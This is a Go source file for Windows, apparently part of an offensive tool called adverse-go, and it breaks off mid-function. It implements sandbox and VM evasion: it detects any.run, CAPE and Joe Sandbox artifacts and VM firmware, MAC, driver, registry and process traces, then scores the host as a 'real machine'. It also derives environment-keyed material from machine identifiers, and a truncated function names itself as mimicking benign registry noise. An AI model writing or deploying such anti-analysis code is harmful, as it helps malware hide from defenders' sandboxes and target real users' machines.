//go:build windows

package behavioural

import (
	"context"
	"crypto/sha256"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"github.com/ashwnn/adverse-go/internal/anti"
	"github.com/ashwnn/adverse-go/internal/stealth"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// PlatformGate runs all Windows-specific sandbox/VM detection checks and
// returns a combined signal slice. Strong triggers (debugger, tracer, any.run
// artifacts) cause immediate denial; VM artifacts are weighted negative signals.
// When a VM check does NOT trigger (clean host), the complementary real_*
// positive signal is emitted so scoreGate can reach RealMachineThreshold.
func PlatformGate() []anti.CheckResult {
	var out []anti.CheckResult
	// Any-run / timing checks (negative); emit complementary real_* on clean.
	r := anyrunArtifactCheck()
	out = append(out, r)
	r = anyrunUptimeCheck()
	out = append(out, r)
	if !r.Triggered {
		out = append(out, anti.CheckResult{Name: "real_uptime", Triggered: true, Detail: r.Detail})
	}
	r = anyrunIdleCheck()
	out = append(out, r)
	r = anyrunSpecsCheck()
	out = append(out, r)
	r = anyrunProcessCountCheck()
	out = append(out, r)
	if !r.Triggered {
		out = append(out, anti.CheckResult{Name: "real_processes", Triggered: true, Detail: r.Detail})
	}
	// VM/hardware checks — emit real_* counterpart when clean.
	r = vmSMBIOSCheck()
	out = append(out, r)
	if !r.Triggered {
		out = append(out, anti.CheckResult{Name: "real_smbios", Triggered: true, Detail: "SMBIOS clean"})
	}
	r = vmCPUIDHypervisorCheck()
	out = append(out, r)
	// vmCPUID hypervisor clean does not have a distinct real_*; rely on real_smbios/real_gpu etc.
	r = vmCPUIDVendorCheck()
	out = append(out, r)
	r = vmMACOUICheck()
	out = append(out, r)
	// vm_mac_oui clean contributes via real_smbios indirectly; no direct real_mac.
	r = vmGPUCheck()
	out = append(out, r)
	if !r.Triggered {
		out = append(out, anti.CheckResult{Name: "real_gpu", Triggered: true, Detail: r.Detail})
	}
	r = vmDiskCheck()
	out = append(out, r)
	// disk clean covered by real_smbios/real_gpu; no dedicated real_disk weight.
	r = vmBatteryCheck()
	out = append(out, r)
	if !r.Triggered {
		out = append(out, anti.CheckResult{Name: "real_battery", Triggered: true, Detail: r.Detail})
	}
	r = vmAudioCheck()
	out = append(out, r)
	if !r.Triggered {
		out = append(out, anti.CheckResult{Name: "real_audio", Triggered: true, Detail: r.Detail})
	}
	r = vmSensorsCheck()
	out = append(out, r)
	if !r.Triggered {
		out = append(out, anti.CheckResult{Name: "real_sensors", Triggered: true, Detail: r.Detail})
	}
	r = vmResolutionCheck()
	out = append(out, r)
	if !r.Triggered {
		out = append(out, anti.CheckResult{Name: "real_resolution", Triggered: true, Detail: r.Detail})
	}
	r = vmInstalledAppsCheck()
	out = append(out, r)
	if !r.Triggered {
		out = append(out, anti.CheckResult{Name: "real_apps", Triggered: true, Detail: r.Detail})
	}
	r = vmUserFilesCheck()
	out = append(out, r)
	if !r.Triggered {
		out = append(out, anti.CheckResult{Name: "real_user_files", Triggered: true, Detail: r.Detail})
	}
	r = vmRegistryArtifactCheck()
	out = append(out, r)
	// registry clean covered by real_smbios.
	r = vmFileDriverCheck()
	out = append(out, r)
	r = vmProcessCheck()
	out = append(out, r)
	return out
}

// ---------------------------------------------------------------------------
// Existing any.run checks (unchanged logic, kept for timeline continuity)
// ---------------------------------------------------------------------------

func anyrunArtifactCheck() anti.CheckResult {
	markers := []string{
		`C:\analysis`,
		`C:\sandbox`,
		`C:\Users\admin\AppData\Local\Temp\anyrun`,
		`C:\AnyRun`,
	}
	for _, p := range markers {
		if _, err := os.Stat(p); err == nil {
			return anti.CheckResult{Name: "anyrun_artifact", Triggered: true, Detail: p + " exists"}
		}
	}
	for _, k := range []string{"ANYRUN", "CAPE_MONITOR", "JOEBOX"} {
		if os.Getenv(k) != "" {
			return anti.CheckResult{Name: "anyrun_artifact", Triggered: true, Detail: k + "=present"}
		}
	}
	guid := machineGuidRaw()
	if strings.HasPrefix(strings.ToLower(guid), "4d4c626f") {
		return anti.CheckResult{Name: "anyrun_artifact", Triggered: true, Detail: "MachineGuid template match"}
	}
	return anti.CheckResult{Name: "anyrun_artifact", Triggered: false, Detail: "no any.run artifact"}
}

func anyrunUptimeCheck() anti.CheckResult {
	mod := windows.NewLazySystemDLL("kernel32.dll")
	proc := mod.NewProc("GetTickCount64")
	ret, _, _ := proc.Call()
	uptimeMS := uint64(ret)
	if uptimeMS > 0 && uptimeMS < 240*1000 {
		return anti.CheckResult{Name: "anyrun_uptime", Triggered: true, Detail: fmt.Sprintf("uptime %ds <240s sandbox", uptimeMS/1000)}
	}
	return anti.CheckResult{Name: "anyrun_uptime", Triggered: false, Detail: fmt.Sprintf("uptime %ds", uptimeMS/1000)}
}

func anyrunIdleCheck() anti.CheckResult {
	mod := windows.NewLazySystemDLL("user32.dll")
	qproc := mod.NewProc("GetLastInputInfo")
	type lastInputInfo struct {
		cbSize uint32
		dwTime uint32
	}
	varlii := lastInputInfo{cbSize: uint32(unsafe.Sizeof(lastInputInfo{}))}
	ret, _, _ := qproc.Call(uintptr(unsafe.Pointer(&varlii)))
	if ret == 0 {
		return anti.CheckResult{Name: "anyrun_idle", Triggered: false, Detail: "GetLastInputInfo unavailable"}
	}
	kmod := windows.NewLazySystemDLL("kernel32.dll")
	tproc := kmod.NewProc("GetTickCount")
	tret, _, _ := tproc.Call()
	cur := uint32(tret)
	idle := cur - varlii.dwTime
	if idle > 300*1000 {
		return anti.CheckResult{Name: "anyrun_idle", Triggered: true, Detail: fmt.Sprintf("idle %ds >300s", idle/1000)}
	}
	fproc := mod.NewProc("GetForegroundWindow")
	fret, _, _ := fproc.Call()
	if fret == 0 {
		return anti.CheckResult{Name: "anyrun_idle", Triggered: true, Detail: "no foreground window"}
	}
	return anti.CheckResult{Name: "anyrun_idle", Triggered: false, Detail: fmt.Sprintf("idle %ds", idle/1000)}
}

func anyrunSpecsCheck() anti.CheckResult {
	kmod := windows.NewLazySystemDLL("kernel32.dll")
	type memStatusEx struct {
		dwLength                uint32
		dwMemoryLoad            uint32
		ullTotalPhys            uint64
		ullAvailPhys            uint64
		ullTotalPageFile        uint64
		ullAvailPageFile        uint64
		ullTotalVirtual         uint64
		ullAvailVirtual         uint64
		ullAvailExtendedVirtual uint64
	}
	var m memStatusEx
	m.dwLength = uint32(unsafe.Sizeof(m))
	proc := kmod.NewProc("GlobalMemoryStatusEx")
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&m)))
	if ret != 0 {
		if m.ullTotalPhys >= 3500*1024*1024 && m.ullTotalPhys <= 4500*1024*1024 {
			root := windows.StringToUTF16Ptr(`C:\`)
			var free, total, avail uint64
			dproc := kmod.NewProc("GetDiskFreeSpaceExW")
			dret, _, _ := dproc.Call(uintptr(unsafe.Pointer(root)), uintptr(unsafe.Pointer(&free)), uintptr(unsafe.Pointer(&total)), uintptr(unsafe.Pointer(&avail)))
			if dret != 0 && total >= 50*1024*1024*1024 && total <= 90*1024*1024*1024 {
				return anti.CheckResult{Name: "anyrun_specs", Triggered: true, Detail: fmt.Sprintf("RAM %d GB disk %d GB — sandbox template", m.ullTotalPhys>>30, total>>30)}
			}
		}
	}
	return anti.CheckResult{Name: "anyrun_specs", Triggered: false, Detail: "specs not sandbox-typical"}
}

func anyrunProcessCountCheck() anti.CheckResult {
	inv := func() int {
		mod := windows.NewLazySystemDLL("kernel32.dll")
		cproc := mod.NewProc("CreateToolhelp32Snapshot")
		h, _, _ := cproc.Call(2, 0)
		if h == uintptr(windows.InvalidHandle) || h == 0 {
			return 40 // fail-open: assume real
		}
		defer windows.CloseHandle(windows.Handle(h))
		type pe32 struct {
			dwSize              uint32
			cntUsage            uint32
			th32ProcessID       uint32
			th32DefaultHeapID   uintptr
			th32ModuleID        uint32
			cntThreads          uint32
			th32ParentProcessID uint32
			pcPriClassBase      int32
			dwFlags             uint32
			szExeFile           [260]uint16
		}
		var pe pe32
		pe.dwSize = uint32(unsafe.Sizeof(pe))
		pproc := mod.NewProc("Process32FirstW")
		ret, _, _ := pproc.Call(h, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			return 40
		}
		nproc := mod.NewProc("Process32NextW")
		count := 1
		for {
			ret, _, _ := nproc.Call(h, uintptr(unsafe.Pointer(&pe)))
			if ret == 0 {
				break
			}
			count++
		}
		return count
	}
	c := inv()
	if c > 0 && c < 32 {
		return anti.CheckResult{Name: "anyrun_processes", Triggered: true, Detail: fmt.Sprintf("%d processes <32", c)}
	}
	return anti.CheckResult{Name: "anyrun_processes", Triggered: false, Detail: fmt.Sprintf("%d processes", c)}
}

// ---------------------------------------------------------------------------
// New VM / hardware detection checks
// ---------------------------------------------------------------------------

// vmStrings is the set of substrings indicating a virtual machine in firmware,
// registry, file, or process names.
var vmStrings = []string{
	"vmware", "virtualbox", "vbox", "qemu", "bochs", "xen",
	"microsoft virtual", "kvm", "parallels",
}

// containsVMString checks if s contains any known VM indicator substring.
func containsVMString(s string) bool {
	lower := strings.ToLower(s)
	for _, vm := range vmStrings {
		if strings.Contains(lower, vm) {
			return true
		}
	}
	return false
}

// vmSMBIOSCheck reads BIOS/system firmware strings from the registry
// HKLM\HARDWARE\DESCRIPTION\System\BIOS and checks for VM identifiers.
// Also checks HKLM\SOFTWARE\Microsoft\Cryptography MachineGuid for known
// VM template patterns.
func vmSMBIOSCheck() anti.CheckResult {
	defer func() { recover() }() // safety net — all checks fail open

	// Check registry BIOS fields
	biosKeys := []struct {
		key, val string
	}{
		{`HARDWARE\DESCRIPTION\System\BIOS`, "SystemManufacturer"},
		{`HARDWARE\DESCRIPTION\System\BIOS`, "SystemProductName"},
		{`HARDWARE\DESCRIPTION\System\BIOS`, "BiosVendor"},
		{`HARDWARE\DESCRIPTION\System\BIOS`, "BiosVersion"},
		{`HARDWARE\DESCRIPTION\System\BIOS`, "BaseBoardManufacturer"},
		{`HARDWARE\DESCRIPTION\System\BIOS`, "BaseBoardProduct"},
	}
	for _, bk := range biosKeys {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, bk.key, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		val, _, err := k.GetStringValue(bk.val)
		k.Close()
		if err != nil {
			continue
		}
		if containsVMString(val) {
			return anti.CheckResult{Name: "vm_smbios", Triggered: true, Detail: bk.val + "=" + val}
		}
	}

	// GetSystemFirmwareTable('RSMB') — read raw SMBIOS
	mod := windows.NewLazySystemDLL("kernel32.dll")
	proc := mod.NewProc("GetSystemFirmwareTable")
	// First call: get required buffer size. Signature 'RSMB' = 0x52534D42.
	ret, _, _ := proc.Call(0x52534D42, 0, 0, 0)
	if ret == 0 {
		return anti.CheckResult{Name: "vm_smbios", Triggered: false, Detail: "GetSystemFirmwareTable size=0"}
	}
	buf := make([]byte, ret)
	ret2, _, _ := proc.Call(0x52534D42, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if ret2 == 0 {
		return anti.CheckResult{Name: "vm_smbios", Triggered: false, Detail: "GetSystemFirmwareTable read failed"}
	}
	// Scan raw SMBIOS buffer for VM strings
	firmwareStr := string(buf)
	for _, vm := range vmStrings {
		if strings.Contains(strings.ToLower(firmwareStr), vm) {
			return anti.CheckResult{Name: "vm_smbios", Triggered: true, Detail: "SMBIOS contains " + vm}
		}
	}

	return anti.CheckResult{Name: "vm_smbios", Triggered: false, Detail: "SMBIOS clean"}
}

// vmCPUIDHypervisorCheck executes CPUID via the anti package assembly
// (CPUIDHypervisorPresent) and checks ECX bit 31 (hypervisor present bit).
// This is a HIGH-confidence VM indicator.
//
// The previous fallback used IsProcessorFeaturePresent(37) (PF_VIRTUALIZED),
// which is not a documented Windows API contract — the constant 37 has no
// official meaning in the Win32 API. PF_VIRT_FIRMWARE_ENABLED=21 indicates
// firmware virtualization is enabled (true on many physical machines with
// Intel VT-x/AMD-V) and is also unsuitable as a VM detector. The real
// CPUID leaf-1 ECX bit-31 check exists in internal/anti via cpuid_windows_amd64.s
// assembly and is now called directly.
func vmCPUIDHypervisorCheck() anti.CheckResult {
	defer func() { recover() }()

	present, detail := anti.CPUIDHypervisorPresent()
	if present {
		return anti.CheckResult{Name: "vm_cpuid_hypervisor", Triggered: true, Detail: detail}
	}

	// Alternative: try reading from WMI via registry fallback
	// HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 — ProcessorNameString
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\CentralProcessor\0`, registry.QUERY_VALUE)
	if err != nil {
		return anti.CheckResult{Name: "vm_cpuid_hypervisor", Triggered: false, Detail: "CPUID check unavailable"}
	}
	defer k.Close()
	val, _, err := k.GetStringValue("ProcessorNameString")
	if err != nil {
		return anti.CheckResult{Name: "vm_cpuid_hypervisor", Triggered: false, Detail: "ProcessorNameString unavailable"}
	}
	if containsVMString(val) {
		return anti.CheckResult{Name: "vm_cpuid_hypervisor", Triggered: true, Detail: "CPU name=" + val}
	}

	return anti.CheckResult{Name: "vm_cpuid_hypervisor", Triggered: false, Detail: "no hypervisor indicator"}
}

// vmCPUIDVendorCheck checks for known hypervisor vendor strings via registry
// and system information. The CPUID EAX=0x40000000 leaf returns vendor like
// "VMMWareVMware", "Microsoft Hv", "KVMKVMKVM", "VBoxVBoxVBox".
// We approximate via processor info and Hyper-V registry keys.
func vmCPUIDVendorCheck() anti.CheckResult {
	defer func() { recover() }()

	// Check for Hyper-V: HKLM\SOFTWARE\Microsoft\VirtualMachine\Guest
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\VirtualMachine\Guest`, registry.QUERY_VALUE)
	if err == nil {
		k.Close()
		return anti.CheckResult{Name: "vm_cpuid_vendor", Triggered: true, Detail: "Hyper-V guest registry key present"}
	}
	// Check QEMU/KVM: processor name
	k, err = registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\CentralProcessor\0`, registry.QUERY_VALUE)
	if err == nil {
		defer k.Close()
		val, _, _ := k.GetStringValue("Identifier")
		if containsVMString(val) {
			return anti.CheckResult{Name: "vm_cpuid_vendor", Triggered: true, Detail: "processor identifier=" + val}
		}
	}

	return anti.CheckResult{Name: "vm_cpuid_vendor", Triggered: false, Detail: "no hypervisor vendor match"}
}

// vmMACOUICheck reads the MAC address via GetAdaptersInfo and checks against
// known VM OUI prefixes.
func vmMACOUICheck() anti.CheckResult {
	defer func() { recover() }()

	type ipAddrString struct {
		Next    *ipAddrString
		IpAddr  [16]byte
		IpMask  [16]byte
		Context uint32
	}
	type adapterInfo struct {
		Next             *adapterInfo
		ComboIndex       uint32
		AdapterName      [256]byte
		Description      [128]byte
		AddressLength    uint32
		Address          [8]byte
		Index            uint32
		Type             uint32
		DhcpEnabled      uint32
		CurrentIpAddress *ipAddrString
		IpAddressList    ipAddrString
		GatewayList      ipAddrString
		DhcpServer       ipAddrString
		HaveWins         uint32
		PrimaryWins      ipAddrString
		SecondaryWins    ipAddrString
		LeaseObtained    int64
		LeaseExpires     int64
	}

	// Get required buffer size
	mod := windows.NewLazySystemDLL("iphlpapi.dll")
	proc := mod.NewProc("GetAdaptersInfo")
	var bufLen uint32
	proc.Call(0, uintptr(unsafe.Pointer(&bufLen)))
	if bufLen == 0 {
		return anti.CheckResult{Name: "vm_mac_oui", Triggered: false, Detail: "GetAdaptersInfo size=0"}
	}
	buf := make([]byte, bufLen)
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&bufLen)))
	if ret != 0 {
		return anti.CheckResult{Name: "vm_mac_oui", Triggered: false, Detail: "GetAdaptersInfo failed"}
	}
	ai := (*adapterInfo)(unsafe.Pointer(&buf[0]))

	// Known VM MAC OUI prefixes (3-byte prefixes)
	vmMACPrefixes := [][3]byte{
		{0x00, 0x05, 0x69}, // VMware
		{0x00, 0x0C, 0x29}, // VMware
		{0x00, 0x1C, 0x14}, // VMware
		{0x00, 0x50, 0x56}, // VMware
		{0x08, 0x00, 0x27}, // VirtualBox
		{0x0A, 0x00, 0x27}, // VirtualBox
		{0x00, 0x15, 0x5D}, // Hyper-V
		{0x00, 0x1E, 0x37}, // QEMU/KVM
	}

	for a := ai; a != nil; a = a.Next {
		if a.AddressLength >= 3 {
			mac := a.Address[:3]
			for _, prefix := range vmMACPrefixes {
				if mac[0] == prefix[0] && mac[1] == prefix[1] && mac[2] == prefix[2] {
					return anti.CheckResult{
						Name:      "vm_mac_oui",
						Triggered: true,
						Detail:    fmt.Sprintf("MAC %02x:%02x:%02x matches VM OUI", mac[0], mac[1], mac[2]),
					}
				}
			}
		}
	}

	return anti.CheckResult{Name: "vm_mac_oui", Triggered: false, Detail: "no VM MAC OUI found"}
}

// vmGPUCheck queries Win32_VideoController via WMI registry fallback and
// checks for "Microsoft Basic Display Adapter" or VM-named adapters.
func vmGPUCheck() anti.CheckResult {
	defer func() { recover() }()

	// Use WMI via COM is complex; check known registry paths instead.
	// HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000 — DriverDesc
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000`, registry.QUERY_VALUE)
	if err != nil {
		return anti.CheckResult{Name: "vm_gpu", Triggered: false, Detail: "GPU registry unavailable"}
	}
	defer k.Close()
	val, _, err := k.GetStringValue("DriverDesc")
	if err != nil {
		return anti.CheckResult{Name: "vm_gpu", Triggered: false, Detail: "DriverDesc unavailable"}
	}
	lower := strings.ToLower(val)
	if strings.Contains(lower, "microsoft basic display") || containsVMString(lower) {
		return anti.CheckResult{Name: "vm_gpu", Triggered: true, Detail: "GPU=" + val}
	}
	return anti.CheckResult{Name: "vm_gpu", Triggered: false, Detail: "GPU=" + val}
}

// vmDiskCheck checks disk model for VM identifiers and small disk size.
func vmDiskCheck() anti.CheckResult {
	defer func() { recover() }()

	// Check disk size via GetDiskFreeSpaceExW
	kmod := windows.NewLazySystemDLL("kernel32.dll")
	root := windows.StringToUTF16Ptr(`C:\`)
	var free, total, avail uint64
	proc := kmod.NewProc("GetDiskFreeSpaceExW")
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(root)), uintptr(unsafe.Pointer(&free)), uintptr(unsafe.Pointer(&total)), uintptr(unsafe.Pointer(&avail)))
	if ret != 0 && total > 0 && total < 60*1024*1024*1024 {
		return anti.CheckResult{Name: "vm_disk", Triggered: true, Detail: fmt.Sprintf("disk %d GB <60GB", total>>30)}
	}

	// Check disk model via IOCTL or registry
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0`, registry.QUERY_VALUE)
	if err == nil {
		defer k.Close()
		val, _, _ := k.GetStringValue("Identifier")
		if containsVMString(val) {
			return anti.CheckResult{Name: "vm_disk", Triggered: true, Detail: "disk model=" + val}
		}
	}

	return anti.CheckResult{Name: "vm_disk", Triggered: false, Detail: "disk check clean"}
}

// vmBatteryCheck queries Win32_Battery. No battery on a desktop is normal,
// but its absence in combination with other signals is a MEDIUM VM indicator.
// We use it as a positive signal only (battery present => real machine).
func vmBatteryCheck() anti.CheckResult {
	defer func() { recover() }()

	// Use SetupDi API to check for battery devices
	mod := windows.NewLazySystemDLL("kernel32.dll")
	// GetSystemPowerStatus is simpler
	type systemPowerStatus struct {
		ACLineStatus        byte
		BatteryFlag         byte
		BatteryLifePercent  byte
		Reserved1           byte
		BatteryLifeTime     uint32
		BatteryFullLifeTime uint32
	}
	proc := mod.NewProc("GetSystemPowerStatus")
	var sps systemPowerStatus
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&sps)))
	if ret == 0 {
		return anti.CheckResult{Name: "vm_no_battery", Triggered: false, Detail: "GetSystemPowerStatus unavailable"}
	}
	// BatteryFlag: bit 128 = no battery, bit 129 = unknown
	// If bit 128 is set, no battery is present.
	if sps.BatteryFlag&0x80 != 0 {
		// No battery — this is a MEDIUM signal (desktops legitimately lack batteries)
		return anti.CheckResult{Name: "vm_no_battery", Triggered: true, Detail: "no battery detected"}
	}
	// Battery present => strong real-machine signal
	return anti.CheckResult{Name: "vm_no_battery", Triggered: false, Detail: "battery present"}
}

// vmAudioCheck uses waveOutGetNumDevs to check for audio devices.
func vmAudioCheck() anti.CheckResult {
	defer func() { recover() }()

	mod := windows.NewLazySystemDLL("winmm.dll")
	proc := mod.NewProc("waveOutGetNumDevs")
	ret, _, _ := proc.Call()
	devs := int(ret)
	if devs == 0 {
		return anti.CheckResult{Name: "vm_no_audio", Triggered: true, Detail: "waveOutGetNumDevs=0 no audio device"}
	}
	return anti.CheckResult{Name: "vm_no_audio", Triggered: false, Detail: fmt.Sprintf("waveOutGetNumDevs=%d", devs)}
}

// vmSensorsCheck checks for hardware sensors via registry. VMs typically
// lack physical temperature probes and fans.
func vmSensorsCheck() anti.CheckResult {
	defer func() { recover() }()

	// Check for thermal zone information in registry
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\CurrentControlSet\Services\ThermalZone`, registry.READ)
	if err != nil {
		return anti.CheckResult{Name: "vm_no_sensors", Triggered: true, Detail: "no ThermalZone key"}
	}
	defer k.Close()
	subkeys, err := k.ReadSubKeyNames(-1)
	if err != nil || len(subkeys) == 0 {
		return anti.CheckResult{Name: "vm_no_sensors", Triggered: true, Detail: "empty ThermalZone"}
	}
	return anti.CheckResult{Name: "vm_no_sensors", Triggered: false, Detail: fmt.Sprintf("%d thermal zones", len(subkeys))}
}

// vmResolutionCheck uses GetSystemMetrics to verify screen resolution is
// above sandbox-typical minimums (VMs often default to 1024x768 or lower).
func vmResolutionCheck() anti.CheckResult {
	defer func() { recover() }()

	// GetSystemMetrics(SM_CXSCREEN=0, SM_CYSCREEN=1)
	mod := windows.NewLazySystemDLL("user32.dll")
	proc := mod.NewProc("GetSystemMetrics")
	xret, _, _ := proc.Call(0) // SM_CXSCREEN
	yret, _, _ := proc.Call(1) // SM_CYSCREEN
	cx := int(xret)
	cy := int(yret)
	if cx <= 0 || cy <= 0 {
		return anti.CheckResult{Name: "vm_low_resolution", Triggered: false, Detail: "GetSystemMetrics unavailable"}
	}
	if cx <= 1024 && cy <= 768 {
		return anti.CheckResult{Name: "vm_low_resolution", Triggered: true, Detail: fmt.Sprintf("%dx%d <=1024x768", cx, cy)}
	}
	return anti.CheckResult{Name: "vm_low_resolution", Triggered: false, Detail: fmt.Sprintf("%dx%d", cx, cy)}
}

// vmInstalledAppsCheck counts installed programs from the Uninstall registry
// key. Fewer than 20 installed apps strongly suggests a sandbox environment.
func vmInstalledAppsCheck() anti.CheckResult {
	defer func() { recover() }()

	paths := []string{
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`,
		`SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall`,
	}
	count := 0
	for _, p := range paths {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, p, registry.READ)
		if err != nil {
			continue
		}
		subkeys, err := k.ReadSubKeyNames(-1)
		k.Close()
		if err == nil {
			count += len(subkeys)
		}
	}
	// Also count HKCU uninstall keys
	kcuPaths := []string{
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`,
		`SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall`,
	}
	for _, p := range kcuPaths {
		k, err := registry.OpenKey(registry.CURRENT_USER, p, registry.READ)
		if err != nil {
			continue
		}
		subkeys, err := k.ReadSubKeyNames(-1)
		k.Close()
		if err == nil {
			count += len(subkeys)
		}
	}

	if count > 0 && count < 20 {
		return anti.CheckResult{Name: "vm_few_apps", Triggered: true, Detail: fmt.Sprintf("%d apps <20", count)}
	}
	return anti.CheckResult{Name: "vm_few_apps", Triggered: false, Detail: fmt.Sprintf("%d apps", count)}
}

// vmUserFilesCheck enumerates common user profile directories and checks
// for a realistic number of files. Sandboxes typically have very few.
func vmUserFilesCheck() anti.CheckResult {
	defer func() { recover() }()

	home := os.Getenv("USERPROFILE")
	if home == "" {
		return anti.CheckResult{Name: "vm_few_user_files", Triggered: false, Detail: "USERPROFILE empty"}
	}
	dirs := []string{
		filepath.Join(home, "Documents"),
		filepath.Join(home, "Downloads"),
		filepath.Join(home, "Desktop"),
	}
	totalFiles := 0
	for _, d := range dirs {
		entries, err := os.ReadDir(d)
		if err != nil {
			continue
		}
		totalFiles += len(entries)
	}
	if totalFiles < 5 {
		return anti.CheckResult{Name: "vm_few_user_files", Triggered: true, Detail: fmt.Sprintf("%d user files <5", totalFiles)}
	}
	return anti.CheckResult{Name: "vm_few_user_files", Triggered: false, Detail: fmt.Sprintf("%d user files", totalFiles)}
}

// vmRegistryArtifactCheck looks for known VM guest additions registry keys.
func vmRegistryArtifactCheck() anti.CheckResult {
	defer func() { recover() }()

	vmKeys := []struct {
		path string
		name string
	}{
		{`SOFTWARE\Oracle\VirtualBox Guest Additions`, ""},
		{`SOFTWARE\VMware, Inc.\VMware Tools`, ""},
		{`SYSTEM\CurrentControlSet\Services\VBoxGuest`, ""},
		{`SYSTEM\CurrentControlSet\Services\VBoxMouse`, ""},
		{`SYSTEM\CurrentControlSet\Services\VBoxSF`, ""},
		{`SYSTEM\CurrentControlSet\Services\vmci`, ""},
		{`SYSTEM\CurrentControlSet\Services\vmhgfs`, ""},
		{`HARDWARE\ACPI\DSDT\VBOX__`, ""},
	}
	for _, vk := range vmKeys {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, vk.path, registry.READ)
		if err == nil {
			k.Close()
			return anti.CheckResult{Name: "vm_registry_artifact", Triggered: true, Detail: "HKLM\\" + vk.path}
		}
	}

	return anti.CheckResult{Name: "vm_registry_artifact", Triggered: false, Detail: "no VM registry artifacts"}
}

// vmFileDriverCheck looks for known VM driver files and guest additions paths.
func vmFileDriverCheck() anti.CheckResult {
	defer func() { recover() }()

	driverDir := `C:\Windows\System32\drivers`
	vmDrivers := []string{
		"VBoxGuest.sys", "VBoxMouse.sys", "VBoxSF.sys", "VBoxHook.sys",
		"vmci.sys", "vmhgfs.sys", "vmbus.sys", "vmbushdr.sys",
		"VBoxTray.exe", "VBoxService.exe",
	}
	for _, d := range vmDrivers {
		p := filepath.Join(driverDir, d)
		if _, err := os.Stat(p); err == nil {
			return anti.CheckResult{Name: "vm_file_driver", Triggered: true, Detail: p}
		}
	}

	// Check guest additions install directories
	guestAdditions := []string{
		`C:\Program Files\Oracle\VirtualBox Guest Additions`,
		`C:\Program Files\VMware\VMware Tools`,
		`C:\Program Files (x86)\Oracle\VirtualBox Guest Additions`,
	}
	for _, ga := range guestAdditions {
		if _, err := os.Stat(ga); err == nil {
			return anti.CheckResult{Name: "vm_file_driver", Triggered: true, Detail: ga}
		}
	}

	return anti.CheckResult{Name: "vm_file_driver", Triggered: false, Detail: "no VM files/drivers found"}
}

// vmProcessCheck uses CreateToolhelp32Snapshot to look for known VM processes.
func vmProcessCheck() anti.CheckResult {
	defer func() { recover() }()

	vmProcesses := []string{
		"vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
		"VBoxService.exe", "VBoxTray.exe", "VBoxGuest.exe",
		"qemu-ga.exe", "vdagent.exe", "spice-vdagentd.exe",
		"xenservice.exe",
	}

	type pe32 struct {
		dwSize              uint32
		cntUsage            uint32
		th32ProcessID       uint32
		th32DefaultHeapID   uintptr
		th32ModuleID        uint32
		cntThreads          uint32
		th32ParentProcessID uint32
		pcPriClassBase      int32
		dwFlags             uint32
		szExeFile           [260]uint16
	}

	mod := windows.NewLazySystemDLL("kernel32.dll")
	cproc := mod.NewProc("CreateToolhelp32Snapshot")
	h, _, _ := cproc.Call(2, 0) // TH32CS_SNAPPROCESS = 2
	if h == uintptr(windows.InvalidHandle) || h == 0 {
		return anti.CheckResult{Name: "vm_process", Triggered: false, Detail: "snapshot failed"}
	}
	defer windows.CloseHandle(windows.Handle(h))

	var pe pe32
	pe.dwSize = uint32(unsafe.Sizeof(pe))
	pproc := mod.NewProc("Process32FirstW")
	ret, _, _ := pproc.Call(h, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return anti.CheckResult{Name: "vm_process", Triggered: false, Detail: "Process32First failed"}
	}

	nproc := mod.NewProc("Process32NextW")
	for {
		// Convert szExeFile to Go string
		name := windows.UTF16ToString(pe.szExeFile[:])
		lower := strings.ToLower(name)
		for _, vp := range vmProcesses {
			if lower == vp {
				return anti.CheckResult{Name: "vm_process", Triggered: true, Detail: "VM process: " + name}
			}
		}
		ret, _, _ := nproc.Call(h, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			break
		}
	}

	return anti.CheckResult{Name: "vm_process", Triggered: false, Detail: "no VM processes found"}
}

// ---------------------------------------------------------------------------
// Environmental key material (Windows-specific)
// ---------------------------------------------------------------------------

func platformEnvMaterial() []byte {
	var parts [][]byte
	guid := machineGuidRaw()
	if guid != "" {
		parts = append(parts, []byte(guid))
	}
	vol := volumeSerialRaw()
	if vol != "" {
		parts = append(parts, []byte(vol))
	}
	if cn := os.Getenv("COMPUTERNAME"); cn != "" {
		parts = append(parts, []byte(cn))
	}
	if un := os.Getenv("USERNAME"); un != "" {
		parts = append(parts, []byte(un))
	}
	if len(parts) == 0 {
		return []byte("windows-fallback-env")
	}
	var raw []byte
	for _, p := range parts {
		raw = append(raw, p...)
		raw = append(raw, '|')
	}
	h := sha256.Sum256(raw)
	raw = append(raw, h[:]...)
	raw = append(raw, byte(stealth.Seed()))
	return raw
}

func platformMimicBenignRegistryNoise() {
	benign := []string{
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer`,
